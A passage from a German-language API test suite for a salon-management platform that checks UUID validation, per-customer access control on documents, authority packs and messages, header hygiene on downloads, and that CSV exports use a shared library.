      jsonReq(`${BASE}/api/owner/documents`, 'POST', {
        owner_type: 'location',
        owner_id: 'nicht-uuid',
        doc_type: 'Hygiene-Plan',
      }),
    )
    expect(res.status).toBe(400)
  })

  it('bleibt fuer einen fremden Standort verschlossen', async () => {
    state.session = sessionFor('otherCustomer')
    const res = await ownerDocuments(
      jsonReq(`${BASE}/api/owner/documents`, 'POST', {
        owner_type: 'location',
        owner_id: IDS.salon,
        doc_type: 'Hygiene-Plan',
      }),
    )
    expect(res.status).toBe(403)
  })

  it('Behoerdenpaket: Nicht-UUID als location_id wird abgewiesen', async () => {
    const res = await authoritiesPack(
      jsonReq(`${BASE}/api/owner/authorities-pack`, 'POST', { location_id: 'abc' }),
    )
    expect(res.status).toBe(400)
  })

  it('Download: Nicht-UUID wird abgewiesen, das eigene Paket kommt sauber', async () => {
    const PACK = '40404040-4040-4040-8040-404040404040'
    db().rows('authorities_packs').push({
      id: PACK,
      salon_id: IDS.salon,
      created_at: '2026-08-01T10:00:00.000Z',
    })

    const bad = await packDownload(req(`${BASE}/x`), ctx({ id: 'kaputt' }))
    expect(bad.status).toBe(400)

    const ok = await packDownload(req(`${BASE}/x`), ctx({ id: PACK }))
    expect(ok.status).toBe(200)
    expect(ok.headers.get('content-disposition')).not.toMatch(/[\r\n]/)
    expect(ok.headers.get('cache-control')).toBe('no-store')
  })

  it('Download: ein fremdes Paket bleibt verschlossen', async () => {
    const PACK = '40404040-4040-4040-8040-404040404041'
    db().rows('authorities_packs').push({
      id: PACK,
      salon_id: IDS.salon,
      created_at: '2026-08-01T10:00:00.000Z',
    })
    state.session = sessionFor('otherCustomer')
    const res = await packDownload(req(`${BASE}/x`), ctx({ id: PACK }))
    expect(res.status).toBe(403)
  })

  it('Admin-Dokument-PATCH weist eine Nicht-UUID ab', async () => {
    state.session = sessionFor('admin')
    const res = await adminDocumentPatch(
      jsonReq(`${BASE}/api/admin/documents/kaputt`, 'PATCH', { verified_status: 'approved' }),
      ctx({ id: 'kaputt' }),
    )
    expect(res.status).toBe(400)
  })
})

// ────────────────────────────────────────────────────────────────
// 14. Postfach
// ────────────────────────────────────────────────────────────────
describe('14. Nachrichten: gepruefte IDs statt 22P02', () => {
  beforeEach(() => {
    state.session = sessionFor('customer')
  })

  it('GET auf eine Nicht-UUID ist eine 400, keine 500', async () => {
    const res = await conversationGet(req(`${BASE}/x`), ctx({ conversationId: 'kaputt' }))
    expect(res.status).toBe(400)
  })

  it('GET auf eine fremde Konversation bleibt 403', async () => {
    const CONV = '50505050-5050-4050-8050-505050505050'
    db().rows('conversations').push({ id: CONV, salon_id: null, created_at: '2026-08-01T10:00:00.000Z' })
    db().rows('conversation_participants').push({ id: 'p1', conversation_id: CONV, user_id: IDS.owner })
    const res = await conversationGet(req(`${BASE}/x`), ctx({ conversationId: CONV }))
    expect(res.status).toBe(403)
  })

  it.each([
    ['receiverId', { receiverId: 'kaputt', content: 'hallo' }],
    ['conversationId', { conversationId: 'kaputt', content: 'hallo' }],
    ['salonId', { receiverId: IDS.owner, salonId: 'kaputt', content: 'hallo' }],
  ])('POST weist eine Nicht-UUID als %s ab', async (_label, body) => {
    const res = await messagesPost(jsonReq(`${BASE}/api/messages`, 'POST', body))
    expect(res.status).toBe(400)
    expect(db().insertsInto('messages')).toHaveLength(0)
  })

  it('isUuid akzeptiert nur echte UUIDs', () => {
    expect(isUuid(IDS.customer)).toBe(true)
    expect(isUuid('11111111-1111-1111-1111-111111111111')).toBe(true)
    expect(isUuid('kaputt')).toBe(false)
    expect(isUuid('')).toBe(false)
    expect(isUuid(null)).toBe(false)
    expect(isUuid(`${IDS.customer} `)).toBe(false)
  })
})

// ────────────────────────────────────────────────────────────────
// 15. Kein Rueckfall auf die alten Hand-Escapes
// ────────────────────────────────────────────────────────────────
describe('15. Quelltext-Riegel: CSV wird nirgends mehr von Hand gebaut', () => {
  const dateien = [
    'src/app/api/admin/export/route.ts',
    'src/app/api/provider/dashboard/export/route.ts',
    'src/app/(admin)/admin/newsletter/subscribers/SubscribersClient.tsx',
  ]

  it.each(dateien)('%s nutzt @/lib/csv', async (datei) => {
    const { readFileSync } = await import('node:fs')
    const quelle = readFileSync(datei, 'utf8')
    expect(quelle).toMatch(/from '@\/lib\/csv'/)
    // Kein eigener Escape mehr, der `\r` vergessen koennte.
    expect(quelle).not.toMatch(/function (csvEscape|toCsv)\s*\(/)
  })

  it('die Seite /unsubscribe schreibt nichts mehr in die Datenbank', async () => {
    const { readFileSync } = await import('node:fs')
    const quelle = readFileSync('src/app/unsubscribe/page.tsx', 'utf8')
    expect(quelle).not.toContain('getSupabaseAdmin')
    expect(quelle).not.toContain('.update(')
    expect(quelle).toContain('method="post"')
  })
})
